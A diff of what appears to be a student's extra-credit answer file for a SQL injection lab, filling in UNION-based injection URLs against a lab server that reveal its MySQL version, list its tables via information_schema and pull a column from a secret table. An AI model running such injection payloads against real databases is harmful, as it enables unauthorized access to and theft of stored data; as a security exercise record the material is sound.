@@ -4,9 +4,9 @@ Name: proj2_xtra_cr3dit
 http://3.86.24.15/sqlinject3/?id=%27+union+select+1,+2,+@@version;+--+
 Version: 5.5.50-0ubuntu0.14.04.1
 
+http://3.86.24.15/sqlinject3/?id=0%27+union+select+1%2C2%2Cgroup_concat%28table_name+separator+%27%2C+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27%23
+Tables: SECRETTABLE, foo, inject3_users
 
-Tables: comma separated names
 
-
-
-Secret: secret string
+http://3.86.24.15/sqlinject3/?id=0%27+union+select+1%2C2%2Cgroup_concat%28secret+separator+%27%2C+%27%29+from+SECRETTABLE%23
+Secret: <>
